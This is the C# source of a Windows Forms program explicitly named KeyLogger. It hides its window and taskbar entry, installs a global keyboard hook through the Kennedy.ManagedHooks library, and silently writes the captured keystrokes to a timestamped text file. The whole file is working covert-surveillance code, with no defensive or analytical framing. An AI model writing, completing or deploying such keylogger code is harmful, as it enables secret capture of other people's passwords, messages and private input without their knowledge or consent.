using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        static bool par = true;
        Kennedy.ManagedHooks.KeyboardHook teclado;
        System.IO.StreamWriter texto = System.IO.File.CreateText(DateTime.Now.Year.ToString() + "-" +
                                                                 DateTime.Now.Month.ToString() + "-" +
                                                                 DateTime.Now.Day.ToString() + "-" +
                                                                 DateTime.Now.Hour.ToString() + "-" +
                                                                 DateTime.Now.Minute.ToString() + "-" +
                                                                 DateTime.Now.Second.ToString() + ".txt");
        void keyboardHook_KeyboardEvent(Kennedy.ManagedHooks.KeyboardEvents kEvent, Keys key)
        {
            if (par)
            {
                System.Windows.Forms.KeysConverter temp = new KeysConverter();
                string tecla = temp.ConvertToString(key);
                texto.Write(tecla);
                texto.Flush();
            }
            Par();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Hide();
            ShowInTaskbar = false;
            TopMost = true;
            MaximizeBox = false;
            MinimizeBox = false;
            teclado = new Kennedy.ManagedHooks.KeyboardHook();
            teclado.KeyboardEvent += new Kennedy.ManagedHooks.KeyboardHook.KeyboardEventHandler(keyboardHook_KeyboardEvent);
            teclado.InstallHook();
        }

        public static void Par()
        {
            if (par)
            {
                par = false;
            }
            else
            {
                par = true;
            }
        }

        private void InitializeComponent()
        {
            this.Load += new System.EventHandler(this.Form1_Load);
        }
    }
}
